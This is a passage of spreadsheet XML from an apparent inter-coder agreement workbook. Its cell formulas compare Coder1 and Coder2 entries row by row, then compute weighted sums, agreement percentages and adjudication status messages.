        <f>IF(AND(Coder1!P147&amp;""&lt;&gt;"",Coder1!P147&amp;""=Coder2!P147&amp;""),Coder1!P147,"")</f>
        <v/>
      </c>
      <c r="Q147" s="14">
        <f>IF(AND(Coder1!Q147&amp;""&lt;&gt;"",Coder1!Q147&amp;""=Coder2!Q147&amp;""),Coder1!Q147,"")</f>
        <v/>
      </c>
      <c r="R147" s="14">
        <f>IF(AND(Coder1!R147&amp;""&lt;&gt;"",Coder1!R147&amp;""=Coder2!R147&amp;""),Coder1!R147,"")</f>
        <v/>
      </c>
      <c r="S147" s="14">
        <f>IF(AND(Coder1!S147&amp;""&lt;&gt;"",Coder1!S147&amp;""=Coder2!S147&amp;""),Coder1!S147,"")</f>
        <v/>
      </c>
      <c r="T147" s="14">
        <f>IF(AND(Coder1!T147&amp;""&lt;&gt;"",Coder1!T147&amp;""=Coder2!T147&amp;""),Coder1!T147,"")</f>
        <v/>
      </c>
      <c r="U147" s="14">
        <f>IF(AND(Coder1!U147&amp;""&lt;&gt;"",Coder1!U147&amp;""=Coder2!U147&amp;""),Coder1!U147,"")</f>
        <v/>
      </c>
      <c r="V147" s="14">
        <f>IF(AND(Coder1!V147&amp;""&lt;&gt;"",Coder1!V147&amp;""=Coder2!V147&amp;""),Coder1!V147,"")</f>
        <v/>
      </c>
      <c r="W147" s="14">
        <f>IF(AND(Coder1!W147&amp;""&lt;&gt;"",Coder1!W147&amp;""=Coder2!W147&amp;""),Coder1!W147,"")</f>
        <v/>
      </c>
      <c r="X147" s="14">
        <f>IF(AND(Coder1!X147&amp;""&lt;&gt;"",Coder1!X147&amp;""=Coder2!X147&amp;""),Coder1!X147,"")</f>
        <v/>
      </c>
      <c r="Y147" s="14">
        <f>IF(AND(Coder1!Y147&amp;""&lt;&gt;"",Coder1!Y147&amp;""=Coder2!Y147&amp;""),Coder1!Y147,"")</f>
        <v/>
      </c>
      <c r="Z147" s="14">
        <f>IF(AND(Coder1!Z147&amp;""&lt;&gt;"",Coder1!Z147&amp;""=Coder2!Z147&amp;""),Coder1!Z147,"")</f>
        <v/>
      </c>
      <c r="AA147" s="14">
        <f>IF(AND(Coder1!AA147&amp;""&lt;&gt;"",Coder1!AA147&amp;""=Coder2!AA147&amp;""),Coder1!AA147,"")</f>
        <v/>
      </c>
      <c r="AB147" s="14">
        <f>IF(AND(Coder1!AB147&amp;""&lt;&gt;"",Coder1!AB147&amp;""=Coder2!AB147&amp;""),Coder1!AB147,"")</f>
        <v/>
      </c>
      <c r="AC147" s="14">
        <f>IF(AND(Coder1!AC147&amp;""&lt;&gt;"",Coder1!AC147&amp;""=Coder2!AC147&amp;""),Coder1!AC147,"")</f>
        <v/>
      </c>
      <c r="AD147" s="14">
        <f>IF(AND(Coder1!AD147&amp;""&lt;&gt;"",Coder1!AD147&amp;""=Coder2!AD147&amp;""),Coder1!AD147,"")</f>
        <v/>
      </c>
      <c r="AE147" s="14">
        <f>IF(AND(Coder1!AE147&amp;""&lt;&gt;"",Coder1!AE147&amp;""=Coder2!AE147&amp;""),Coder1!AE147,"")</f>
        <v/>
      </c>
      <c r="AF147" s="14">
        <f>IF(AND(Coder1!AF147&amp;""&lt;&gt;"",Coder1!AF147&amp;""=Coder2!AF147&amp;""),Coder1!AF147,"")</f>
        <v/>
      </c>
      <c r="AG147" s="14">
        <f>IF(AND(Coder1!AG147&amp;""&lt;&gt;"",Coder1!AG147&amp;""=Coder2!AG147&amp;""),Coder1!AG147,"")</f>
        <v/>
      </c>
      <c r="AH147" s="14">
        <f>IF(AND(Coder1!AH147&amp;""&lt;&gt;"",Coder1!AH147&amp;""=Coder2!AH147&amp;""),Coder1!AH147,"")</f>
        <v/>
      </c>
      <c r="AI147" s="11">
        <f>IF(COUNT(E147:L147)=0,"",SUM(E147:L147))</f>
        <v/>
      </c>
      <c r="AJ147" s="11">
        <f>IF(AI147="","",N(E147)*3+N(F147)*2+N(G147)*2+N(H147)*2+N(I147)*2+N(J147)*3+N(K147)*3+N(L147)*3)</f>
        <v/>
      </c>
      <c r="AK147" s="11">
        <f>IF(AI147="","",COUNTIF(N147:AG147,1))</f>
        <v/>
      </c>
      <c r="AL147" s="11">
        <f>IF(OR(AJ147="",AJ147=0),"",ROUND(100*(AJ147-AK147)/AJ147,1))</f>
        <v/>
      </c>
      <c r="AM147" s="11">
        <f>IF(AND(Coder1!AN147=1,Coder2!AN147=1),IF(COUNTBLANK(E147:AH147)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN147" s="11">
        <f>IF(AND(Coder1!AN147=1,Coder2!AN147=1),IF(SUMPRODUCT(--(Coder1!E147:AH147&amp;""&lt;&gt;Coder2!E147:AH147&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO147" s="11" t="n"/>
    </row>
    <row r="148">
      <c r="A148" s="11">
        <f>Coder1!A148</f>
        <v/>
      </c>
      <c r="B148" s="11">
        <f>Coder1!B148</f>
        <v/>
      </c>
      <c r="C148" s="11">
        <f>Coder1!C148</f>
        <v/>
      </c>
      <c r="D148" s="11">
        <f>Coder1!D148</f>
        <v/>
      </c>
      <c r="E148" s="14">
        <f>IF(AND(Coder1!E148&amp;""&lt;&gt;"",Coder1!E148&amp;""=Coder2!E148&amp;""),Coder1!E148,"")</f>
        <v/>
      </c>
      <c r="F148" s="14">
        <f>IF(AND(Coder1!F148&amp;""&lt;&gt;"",Coder1!F148&amp;""=Coder2!F148&amp;""),Coder1!F148,"")</f>
        <v/>
      </c>
      <c r="G148" s="14">
        <f>IF(AND(Coder1!G148&amp;""&lt;&gt;"",Coder1!G148&amp;""=Coder2!G148&amp;""),Coder1!G148,"")</f>
        <v/>
      </c>
      <c r="H148" s="14">
        <f>IF(AND(Coder1!H148&amp;""&lt;&gt;"",Coder1!H148&amp;""=Coder2!H148&amp;""),Coder1!H148,"")</f>
        <v/>
      </c>
      <c r="I148" s="14">
        <f>IF(AND(Coder1!I148&amp;""&lt;&gt;"",Coder1!I148&amp;""=Coder2!I148&amp;""),Coder1!I148,"")</f>
        <v/>
      </c>
      <c r="J148" s="14">
        <f>IF(AND(Coder1!J148&amp;""&lt;&gt;"",Coder1!J148&amp;""=Coder2!J148&amp;""),Coder1!J148,"")</f>
        <v/>
      </c>
      <c r="K148" s="14">
        <f>IF(AND(Coder1!K148&amp;""&lt;&gt;"",Coder1!K148&amp;""=Coder2!K148&amp;""),Coder1!K148,"")</f>
        <v/>
      </c>
      <c r="L148" s="14">
        <f>IF(AND(Coder1!L148&amp;""&lt;&gt;"",Coder1!L148&amp;""=Coder2!L148&amp;""),Coder1!L148,"")</f>
        <v/>
      </c>
      <c r="M148" s="14">
        <f>IF(AND(Coder1!M148&amp;""&lt;&gt;"",Coder1!M148&amp;""=Coder2!M148&amp;""),Coder1!M148,"")</f>
        <v/>
      </c>
      <c r="N148" s="14">
        <f>IF(AND(Coder1!N148&amp;""&lt;&gt;"",Coder1!N148&amp;""=Coder2!N148&amp;""),Coder1!N148,"")</f>
        <v/>
      </c>
      <c r="O148" s="14">
        <f>IF(AND(Coder1!O148&amp;""&lt;&gt;"",Coder1!O148&amp;""=Coder2!O148&amp;""),Coder1!O148,"")</f>
        <v/>
      </c>
      <c r="P148" s="14">
        <f>IF(AND(Coder1!P148&amp;""&lt;&gt;"",Coder1!P148&amp;""=Coder2!P148&amp;""),Coder1!P148,"")</f>
        <v/>
      </c>
      <c r="Q148" s="14">
        <f>IF(AND(Coder1!Q148&amp;""&lt;&gt;"",Coder1!Q148&amp;""=Coder2!Q148&amp;""),Coder1!Q148,"")</f>
        <v/>
      </c>
      <c r="R148" s="14">
        <f>IF(AND(Coder1!R148&amp;""&lt;&gt;"",Coder1!R148&amp;""=Coder2!R148&amp;""),Coder1!R148,"")</f>
        <v/>
      </c>
      <c r="S148" s="14">
        <f>IF(AND(Coder1!S148&amp;""&lt;&gt;"",Coder1!S148&amp;""=Coder2!S148&amp;""),Coder1!S148,"")</f>
        <v/>
      </c>
      <c r="T148" s="14">
        <f>IF(AND(Coder1!T148&amp;""&lt;&gt;"",Coder1!T148&amp;""=Coder2!T148&amp;""),Coder1!T148,"")</f>
        <v/>
      </c>
      <c r="U148" s="14">
        <f>IF(AND(Coder1!U148&amp;""&lt;&gt;"",Coder1!U148&amp;""=Coder2!U148&amp;""),Coder1!U148,"")</f>
        <v/>
      </c>
      <c r="V148" s="14">
        <f>IF(AND(Coder1!V148&amp;""&lt;&gt;"",Coder1!V148&amp;""=Coder2!V148&amp;""),Coder1!V148,"")</f>
        <v/>
      </c>
      <c r="W148" s="14">
        <f>IF(AND(Coder1!W148&amp;""&lt;&gt;"",Coder1!W148&amp;""=Coder2!W148&amp;""),Coder1!W148,"")</f>
        <v/>
      </c>
      <c r="X148" s="14">
        <f>IF(AND(Coder1!X148&amp;""&lt;&gt;"",Coder1!X148&amp;""=Coder2!X148&amp;""),Coder1!X148,"")</f>
        <v/>
      </c>
      <c r="Y148" s="14">
        <f>IF(AND(Coder1!Y148&amp;""&lt;&gt;"",Coder1!Y148&amp;""=Coder2!Y148&amp;""),Coder1!Y148,"")</f>
        <v/>
      </c>
      <c r="Z148" s="14">
        <f>IF(AND(Coder1!Z148&amp;""&lt;&gt;"",Coder1!Z148&amp;""=Coder2!Z148&amp;""),Coder1!Z148,"")</f>
        <v/>
      </c>
      <c r="AA148" s="14">
        <f>IF(AND(Coder1!AA148&amp;""&lt;&gt;"",Coder1!AA148&amp;""=Coder2!AA148&amp;""),Coder1!AA148,"")</f>
        <v/>
      </c>
      <c r="AB148" s="14">
        <f>IF(AND(Coder1!AB148&amp;""&lt;&gt;"",Coder1!AB148&amp;""=Coder2!AB148&amp;""),Coder1!AB148,"")</f>
        <v/>
      </c>
      <c r="AC148" s="14">
        <f>IF(AND(Coder1!AC148&amp;""&lt;&gt;"",Coder1!AC148&amp;""=Coder2!AC148&amp;""),Coder1!AC148,"")</f>
        <v/>
      </c>
      <c r="AD148" s="14">
        <f>IF(AND(Coder1!AD148&amp;""&lt;&gt;"",Coder1!AD148&amp;""=Coder2!AD148&amp;""),Coder1!AD148,"")</f>
        <v/>
      </c>
      <c r="AE148" s="14">
        <f>IF(AND(Coder1!AE148&amp;""&lt;&gt;"",Coder1!AE148&amp;""=Coder2!AE148&amp;""),Coder1!AE148,"")</f>
        <v/>
      </c>
      <c r="AF148" s="14">
        <f>IF(AND(Coder1!AF148&amp;""&lt;&gt;"",Coder1!AF148&amp;""=Coder2!AF148&amp;""),Coder1!AF148,"")</f>
        <v/>
      </c>
      <c r="AG148" s="14">
        <f>IF(AND(Coder1!AG148&amp;""&lt;&gt;"",Coder1!AG148&amp;""=Coder2!AG148&amp;""),Coder1!AG148,"")</f>
        <v/>
      </c>
      <c r="AH148" s="14">
        <f>IF(AND(Coder1!AH148&amp;""&lt;&gt;"",Coder1!AH148&amp;""=Coder2!AH148&amp;""),Coder1!AH148,"")</f>
        <v/>
      </c>
      <c r="AI148" s="11">
        <f>IF(COUNT(E148:L148)=0,"",SUM(E148:L148))</f>
        <v/>
      </c>
      <c r="AJ148" s="11">
        <f>IF(AI148="","",N(E148)*3+N(F148)*2+N(G148)*2+N(H148)*2+N(I148)*2+N(J148)*3+N(K148)*3+N(L148)*3)</f>
        <v/>
      </c>
      <c r="AK148" s="11">
        <f>IF(AI148="","",COUNTIF(N148:AG148,1))</f>
        <v/>
      </c>
      <c r="AL148" s="11">
        <f>IF(OR(AJ148="",AJ148=0),"",ROUND(100*(AJ148-AK148)/AJ148,1))</f>
        <v/>
      </c>
      <c r="AM148" s="11">
        <f>IF(AND(Coder1!AN148=1,Coder2!AN148=1),IF(COUNTBLANK(E148:AH148)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN148" s="11">
        <f>IF(AND(Coder1!AN148=1,Coder2!AN148=1),IF(SUMPRODUCT(--(Coder1!E148:AH148&amp;""&lt;&gt;Coder2!E148:AH148&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO148" s="11" t="n"/>
    </row>
    <row r="149">
      <c r="A149" s="11">
        <f>Coder1!A149</f>
        <v/>
      </c>
      <c r="B149" s="11">
        <f>Coder1!B149</f>
        <v/>
      </c>
      <c r="C149" s="11">
        <f>Coder1!C149</f>
        <v/>
      </c>
      <c r="D149" s="11">
        <f>Coder1!D149</f>
        <v/>
      </c>
      <c r="E149" s="14">
        <f>IF(AND(Coder1!E149&amp;""&lt;&gt;"",Coder1!E149&amp;""=Coder2!E149&amp;""),Coder1!E149,"")</f>
        <v/>
      </c>
      <c r="F149" s="14">
        <f>IF(AND(Coder1!F149&amp;""&lt;&gt;"",Coder1!F149&amp;""=Coder2!F149&amp;""),Coder1!F149,"")</f>
        <v/>
      </c>
      <c r="G149" s="14">
        <f>IF(AND(Coder1!G149&amp;""&lt;&gt;"",Coder1!G149&amp;""=Coder2!G149&amp;""),Coder1!G149,"")</f>
        <v/>
      </c>
      <c r="H149" s="14">
        <f>IF(AND(Coder1!H149&amp;""&lt;&gt;"",Coder1!H149&amp;""=Coder2!H149&amp;""),Coder1!H149,"")</f>
        <v/>
      </c>
      <c r="I149" s="14">
        <f>IF(AND(Coder1!I149&amp;""&lt;&gt;"",Coder1!I149&amp;""=Coder2!I149&amp;""),Coder1!I149,"")</f>
        <v/>
      </c>
      <c r="J149" s="14">
        <f>IF(AND(Coder1!J149&amp;""&lt;&gt;"",Coder1!J149&amp;""=Coder2!J149&amp;""),Coder1!J149,"")</f>
        <v/>
      </c>
      <c r="K149" s="14">
        <f>IF(AND(Coder1!K149&amp;""&lt;&gt;"",Coder1!K149&amp;""=Coder2!K149&amp;""),Coder1!K149,"")</f>
        <v/>
      </c>
      <c r="L149" s="14">
        <f>IF(AND(Coder1!L149&amp;""&lt;&gt;"",Coder1!L149&amp;""=Coder2!L149&amp;""),Coder1!L149,"")</f>
        <v/>
      </c>
      <c r="M149" s="14">
        <f>IF(AND(Coder1!M149&amp;""&lt;&gt;"",Coder1!M149&amp;""=Coder2!M149&amp;""),Coder1!M149,"")</f>
        <v/>
      </c>
      <c r="N149" s="14">
        <f>IF(AND(Coder1!N149&amp;""&lt;&gt;"",Coder1!N149&amp;""=Coder2!N149&amp;""),Coder1!N149,"")</f>
        <v/>
      </c>
      <c r="O149" s="14">
        <f>IF(AND(Coder1!O149&amp;""&lt;&gt;"",Coder1!O149&amp;""=Coder2!O149&amp;""),Coder1!O149,"")</f>
        <v/>
      </c>
      <c r="P149" s="14">
        <f>IF(AND(Coder1!P149&amp;""&lt;&gt;"",Coder1!P149&amp;""=Coder2!P149&amp;""),Coder1!P149,"")</f>
        <v/>
      </c>
      <c r="Q149" s="14">
        <f>IF(AND(Coder1!Q149&amp;""&lt;&gt;"",Coder1!Q149&amp;""=Coder2!Q149&amp;""),Coder1!Q149,"")</f>
        <v/>
      </c>
      <c r="R149" s="14">
        <f>IF(AND(Coder1!R149&amp;""&lt;&gt;"",Coder1!R149&amp;""=Coder2!R149&amp;""),Coder1!R149,"")</f>
        <v/>
      </c>
      <c r="S149" s="14">
        <f>IF(AND(Coder1!S149&amp;""&lt;&gt;"",Coder1!S149&amp;""=Coder2!S149&amp;""),Coder1!S149,"")</f>
        <v/>
      </c>
      <c r="T149" s="14">
        <f>IF(AND(Coder1!T149&amp;""&lt;&gt;"",Coder1!T149&amp;""=Coder2!T149&amp;""),Coder1!T149,"")</f>
        <v/>
      </c>
      <c r="U149" s="14">
        <f>IF(AND(Coder1!U149&amp;""&lt;&gt;"",Coder1!U149&amp;""=Coder2!U149&amp;""),Coder1!U149,"")</f>
        <v/>
      </c>
      <c r="V149" s="14">
        <f>IF(AND(Coder1!V149&amp;""&lt;&gt;"",Coder1!V149&amp;""=Coder2!V149&amp;""),Coder1!V149,"")</f>
        <v/>
      </c>
      <c r="W149" s="14">
        <f>IF(AND(Coder1!W149&amp;""&lt;&gt;"",Coder1!W149&amp;""=Coder2!W149&amp;""),Coder1!W149,"")</f>
        <v/>
      </c>
      <c r="X149" s="14">
        <f>IF(AND(Coder1!X149&amp;""&lt;&gt;"",Coder1!X149&amp;""=Coder2!X149&amp;""),Coder1!X149,"")</f>
        <v/>
      </c>
      <c r="Y149" s="14">
        <f>IF(AND(Coder1!Y149&amp;""&lt;&gt;"",Coder1!Y149&amp;""=Coder2!Y149&amp;""),Coder1!Y149,"")</f>
        <v/>
      </c>
      <c r="Z149" s="14">
        <f>IF(AND(Coder1!Z149&amp;""&lt;&gt;"",Coder1!Z149&amp;""=Coder2!Z149&amp;""),Coder1!Z149,"")</f>
        <v/>
      </c>
      <c r="AA149" s="14">
        <f>IF(AND(Coder1!AA149&amp;""&lt;&gt;"",Coder1!AA149&amp;""=Coder2!AA149&amp;""),Coder1!AA149,"")</f>
        <v/>
      </c>
      <c r="AB149" s="14">
        <f>IF(AND(Coder1!AB149&amp;""&lt;&gt;"",Coder1!AB149&amp;""=Coder2!AB149&amp;""),Coder1!AB149,"")</f>
        <v/>
      </c>
      <c r="AC149" s="14">
        <f>IF(AND(Coder1!AC149&amp;""&lt;&gt;"",Coder1!AC149&amp;""=Coder2!AC149&amp;""),Coder1!AC149,"")</f>
        <v/>
      </c>
      <c r="AD149" s="14">
        <f>IF(AND(Coder1!AD149&amp;""&lt;&gt;"",Coder1!AD149&amp;""=Coder2!AD149&amp;""),Coder1!AD149,"")</f>
        <v/>
      </c>
      <c r="AE149" s="14">
        <f>IF(AND(Coder1!AE149&amp;""&lt;&gt;"",Coder1!AE149&amp;""=Coder2!AE149&amp;""),Coder1!AE149,"")</f>
        <v/>
      </c>
      <c r="AF149" s="14">
        <f>IF(AND(Coder1!AF149&amp;""&lt;&gt;"",Coder1!AF149&amp;""=Coder2!AF149&amp;""),Coder1!AF149,"")</f>
        <v/>
      </c>
      <c r="AG149" s="14">
        <f>IF(AND(Coder1!AG149&amp;""&lt;&gt;"",Coder1!AG149&amp;""=Coder2!AG149&amp;""),Coder1!AG149,"")</f>
        <v/>
      </c>
      <c r="AH149" s="14">
        <f>IF(AND(Coder1!AH149&amp;""&lt;&gt;"",Coder1!AH149&amp;""=Coder2!AH149&amp;""),Coder1!AH149,"")</f>
        <v/>
      </c>
      <c r="AI149" s="11">
        <f>IF(COUNT(E149:L149)=0,"",SUM(E149:L149))</f>
        <v/>
      </c>
      <c r="AJ149" s="11">
        <f>IF(AI149="","",N(E149)*3+N(F149)*2+N(G149)*2+N(H149)*2+N(I149)*2+N(J149)*3+N(K149)*3+N(L149)*3)</f>
        <v/>
      </c>
      <c r="AK149" s="11">
        <f>IF(AI149="","",COUNTIF(N149:AG149,1))</f>
        <v/>
      </c>
      <c r="AL149" s="11">
        <f>IF(OR(AJ149="",AJ149=0),"",ROUND(100*(AJ149-AK149)/AJ149,1))</f>
        <v/>
      </c>
      <c r="AM149" s="11">
        <f>IF(AND(Coder1!AN149=1,Coder2!AN149=1),IF(COUNTBLANK(E149:AH149)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN149" s="11">
        <f>IF(AND(Coder1!AN149=1,Coder2!AN149=1),IF(SUMPRODUCT(--(Coder1!E149:AH149&amp;""&lt;&gt;Coder2!E149:AH149&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO149" s="11" t="n"/>
    </row>
    <row r="150">
      <c r="A150" s="11">
        <f>Coder1!A150</f>
        <v/>
      </c>
      <c r="B150" s="11">
        <f>Coder1!B150</f>
        <v/>
      </c>
      <c r="C150" s="11">
        <f>Coder1!C150</f>
        <v/>
      </c>
      <c r="D150" s="11">
        <f>Coder1!D150</f>
        <v/>
      </c>
      <c r="E150" s="14">
        <f>IF(AND(Coder1!E150&amp;""&lt;&gt;"",Coder1!E150&amp;""=Coder2!E150&amp;""),Coder1!E150,"")</f>
        <v/>
      </c>
      <c r="F150" s="14">
        <f>IF(AND(Coder1!F150&amp;""&lt;&gt;"",Coder1!F150&amp;""=Coder2!F150&amp;""),Coder1!F150,"")</f>
        <v/>
      </c>
      <c r="G150" s="14">
        <f>IF(AND(Coder1!G150&amp;""&lt;&gt;"",Coder1!G150&amp;""=Coder2!G150&amp;""),Coder1!G150,"")</f>
        <v/>
      </c>
      <c r="H150" s="14">
        <f>IF(AND(Coder1!H150&amp;""&lt;&gt;"",Coder1!H150&amp;""=Coder2!H150&amp;""),Coder1!H150,"")</f>
        <v/>
      </c>
      <c r="I150" s="14">
        <f>IF(AND(Coder1!I150&amp;""&lt;&gt;"",Coder1!I150&amp;""=Coder2!I150&amp;""),Coder1!I150,"")</f>
        <v/>
      </c>
      <c r="J150" s="14">
        <f>IF(AND(Coder1!J150&amp;""&lt;&gt;"",Coder1!J150&amp;""=Coder2!J150&amp;""),Coder1!J150,"")</f>
        <v/>
      </c>
      <c r="K150" s="14">
        <f>IF(AND(Coder1!K150&amp;""&lt;&gt;"",Coder1!K150&amp;""=Coder2!K150&amp;""),Coder1!K150,"")</f>
        <v/>
      </c>
      <c r="L150" s="14">
        <f>IF(AND(Coder1!L150&amp;""&lt;&gt;"",Coder1!L150&amp;""=Coder2!L150&amp;""),Coder1!L150,"")</f>
        <v/>
      </c>
      <c r="M150" s="14">
        <f>IF(AND(Coder1!M150&amp;""&lt;&gt;"",Coder1!M150&amp;""=Coder2!M150&amp;""),Coder1!M150,"")</f>
        <v/>
      </c>
      <c r="N150" s="14">
        <f>IF(AND(Coder1!N150&amp;""&lt;&gt;"",Coder1!N150&amp;""=Coder2!N150&amp;""),Coder1!N150,"")</f>
        <v/>
      </c>
      <c r="O150" s="14">
        <f>IF(AND(Coder1!O150&amp;""&lt;&gt;"",Coder1!O150&amp;""=Coder2!O150&amp;""),Coder1!O150,"")</f>
        <v/>
      </c>
      <c r="P150" s="14">
        <f>IF(AND(Coder1!P150&amp;""&lt;&gt;"",Coder1!P150&amp;""=Coder2!P150&amp;""),Coder1!P150,"")</f>
        <v/>
      </c>
      <c r="Q150" s="14">
        <f>IF(AND(Coder1!Q150&amp;""&lt;&gt;"",Coder1!Q150&amp;""=Coder2!Q150&amp;""),Coder1!Q150,"")</f>
        <v/>
      </c>
      <c r="R150" s="14">
        <f>IF(AND(Coder1!R150&amp;""&lt;&gt;"",Coder1!R150&amp;""=Coder2!R150&amp;""),Coder1!R150,"")</f>
        <v/>
      </c>
      <c r="S150" s="14">
        <f>IF(AND(Coder1!S150&amp;""&lt;&gt;"",Coder1!S150&amp;""=Coder2!S150&amp;""),Coder1!S150,"")</f>
        <v/>
      </c>
      <c r="T150" s="14">
        <f>IF(AND(Coder1!T150&amp;""&lt;&gt;"",Coder1!T150&amp;""=Coder2!T150&amp;""),Coder1!T150,"")</f>
        <v/>
      </c>
      <c r="U150" s="14">
        <f>IF(AND(Coder1!U150&amp;""&lt;&gt;"",Coder1!U150&amp;""=Coder2!U150&amp;""),Coder1!U150,"")</f>
        <v/>
      </c>
      <c r="V150" s="14">
        <f>IF(AND(Coder1!V150&amp;""&lt;&gt;"",Coder1!V150&amp;""=Coder2!V150&amp;""),Coder1!V150,"")</f>
        <v/>
      </c>
      <c r="W150" s="14">
        <f>IF(AND(Coder1!W150&amp;""&lt;&gt;"",Coder1!W150&amp;""=Coder2!W150&amp;""),Coder1!W150,"")</f>
        <v/>
      </c>
      <c r="X150" s="14">
        <f>IF(AND(Coder1!X150&amp;""&lt;&gt;"",Coder1!X150&amp;""=Coder2!X150&amp;""),Coder1!X150,"")</f>
        <v/>
      </c>
      <c r="Y150" s="14">
        <f>IF(AND(Coder1!Y150&amp;""&lt;&gt;"",Coder1!Y150&amp;""=Coder2!Y150&amp;""),Coder1!Y150,"")</f>
        <v/>
      </c>
      <c r="Z150" s="14">
        <f>IF(AND(Coder1!Z150&amp;""&lt;&gt;"",Coder1!Z150&amp;""=Coder2!Z150&amp;""),Coder1!Z150,"")</f>
        <v/>
      </c>
      <c r="AA150" s="14">
        <f>IF(AND(Coder1!AA150&amp;""&lt;&gt;"",Coder1!AA150&amp;""=Coder2!AA150&amp;""),Coder1!AA150,"")</f>
        <v/>
      </c>
      <c r="AB150" s="14">
        <f>IF(AND(Coder1!AB150&amp;""&lt;&gt;"",Coder1!AB150&amp;""=Coder2!AB150&amp;""),Coder1!AB150,"")</f>
        <v/>
      </c>
      <c r="AC150" s="14">
        <f>IF(AND(Coder1!AC150&amp;""&lt;&gt;"",Coder1!AC150&amp;""=Coder2!AC150&amp;""),Coder1!AC150,"")</f>
        <v/>
      </c>
      <c r="AD150" s="14">
        <f>IF(AND(Coder1!AD150&amp;""&lt;&gt;"",Coder1!AD150&amp;""=Coder2!AD150&amp;""),Coder1!AD150,"")</f>
        <v/>
      </c>
      <c r="AE150" s="14">
        <f>IF(AND(Coder1!AE150&amp;""&lt;&gt;"",Coder1!AE150&amp;""=Coder2!AE150&amp;""),Coder1!AE150,"")</f>
        <v/>
      </c>
      <c r="AF150" s="14">
        <f>IF(AND(Coder1!AF150&amp;""&lt;&gt;"",Coder1!AF150&amp;""=Coder2!AF150&amp;""),Coder1!AF150,"")</f>
        <v/>
      </c>
      <c r="AG150" s="14">
        <f>IF(AND(Coder1!AG150&amp;""&lt;&gt;"",Coder1!AG150&amp;""=Coder2!AG150&amp;""),Coder1!AG150,"")</f>
        <v/>
      </c>
      <c r="AH150" s="14">
        <f>IF(AND(Coder1!AH150&amp;""&lt;&gt;"",Coder1!AH150&amp;""=Coder2!AH150&amp;""),Coder1!AH150,"")</f>
        <v/>
      </c>
      <c r="AI150" s="11">
        <f>IF(COUNT(E150:L150)=0,"",SUM(E150:L150))</f>
        <v/>
      </c>
      <c r="AJ150" s="11">
        <f>IF(AI150="","",N(E150)*3+N(F150)*2+N(G150)*2+N(H150)*2+N(I150)*2+N(J150)*3+N(K150)*3+N(L150)*3)</f>
        <v/>
      </c>
      <c r="AK150" s="11">
        <f>IF(AI150="","",COUNTIF(N150:AG150,1))</f>
        <v/>
      </c>
      <c r="AL150" s="11">
        <f>IF(OR(AJ150="",AJ150=0),"",ROUND(100*(AJ150-AK150)/AJ150,1))</f>
        <v/>
      </c>
      <c r="AM150" s="11">
        <f>IF(AND(Coder1!AN150=1,Coder2!AN150=1),IF(COUNTBLANK(E150:AH150)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN150" s="11">
        <f>IF(AND(Coder1!AN150=1,Coder2!AN150=1),IF(SUMPRODUCT(--(Coder1!E150:AH150&amp;""&lt;&gt;Coder2!E150:AH150&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO150" s="11" t="n"/>
    </row>
    <row r="151">
      <c r="A151" s="11">
        <f>Coder1!A151</f>
        <v/>
      </c>
      <c r="B151" s="11">
        <f>Coder1!B151</f>
        <v/>
      </c>
      <c r="C151" s="11">
        <f>Coder1!C151</f>
        <v/>
      </c>
      <c r="D151" s="11">
        <f>Coder1!D151</f>
        <v/>
      </c>
      <c r="E151" s="14">
        <f>IF(AND(Coder1!E151&amp;""&lt;&gt;"",Coder1!E151&amp;""=Coder2!E151&amp;""),Coder1!E151,"")</f>
        <v/>
      </c>
      <c r="F151" s="14">
        <f>IF(AND(Coder1!F151&amp;""&lt;&gt;"",Coder1!F151&amp;""=Coder2!F151&amp;""),Coder1!F151,"")</f>
        <v/>
      </c>
      <c r="G151" s="14">
        <f>IF(AND(Coder1!G151&amp;""&lt;&gt;"",Coder1!G151&amp;""=Coder2!G151&amp;""),Coder1!G151,"")</f>
        <v/>
      </c>
      <c r="H151" s="14">
        <f>IF(AND(Coder1!H151&amp;""&lt;&gt;"",Coder1!H151&amp;""=Coder2!H151&amp;""),Coder1!H151,"")</f>
        <v/>
      </c>
      <c r="I151" s="14">
        <f>IF(AND(Coder1!I151&amp;""&lt;&gt;"",Coder1!I151&amp;""=Coder2!I151&amp;""),Coder1!I151,"")</f>
        <v/>
      </c>
      <c r="J151" s="14">
        <f>IF(AND(Coder1!J151&amp;""&lt;&gt;"",Coder1!J151&amp;""=Coder2!J151&amp;""),Coder1!J151,"")</f>
        <v/>
      </c>
      <c r="K151" s="14">
        <f>IF(AND(Coder1!K151&amp;""&lt;&gt;"",Coder1!K151&amp;""=Coder2!K151&amp;""),Coder1!K151,"")</f>
        <v/>
      </c>
      <c r="L151" s="14">
        <f>IF(AND(Coder1!L151&amp;""&lt;&gt;"",Coder1!L151&amp;""=Coder2!L151&amp;""),Coder1!L151,"")</f>
        <v/>
      </c>
      <c r="M151" s="14">
        <f>IF(AND(Coder1!M151&amp;""&lt;&gt;"",Coder1!M151&amp;""=Coder2!M151&amp;""),Coder1!M151,"")</f>
        <v/>
      </c>
      <c r="N151" s="14">
        <f>IF(AND(Coder1!N151&amp;""&lt;&gt;"",Coder1!N151&amp;""=Coder2!N151&amp;""),Coder1!N151,"")</f>
        <v/>
      </c>
      <c r="O151" s="14">
        <f>IF(AND(Coder1!O151&amp;""&lt;&gt;"",Coder1!O151&amp;""=Coder2!O151&amp;""),Coder1!O151,"")</f>
        <v/>
      </c>
      <c r="P151" s="14">
        <f>IF(AND(Coder1!P151&amp;""&lt;&gt;"",Coder1!P151&amp;""=Coder2!P151&amp;""),Coder1!P151,"")</f>
        <v/>
      </c>
      <c r="Q151" s="14">
        <f>IF(AND(Coder1!Q151&amp;""&lt;&gt;"",Coder1!Q151&amp;""=Coder2!Q151&amp;""),Coder1!Q151,"")</f>
        <v/>
      </c>
      <c r="R151" s="14">
        <f>IF(AND(Coder1!R151&amp;""&lt;&gt;"",Coder1!R151&amp;""=Coder2!R151&amp;""),Coder1!R151,"")</f>
        <v/>
      </c>
      <c r="S151" s="14">
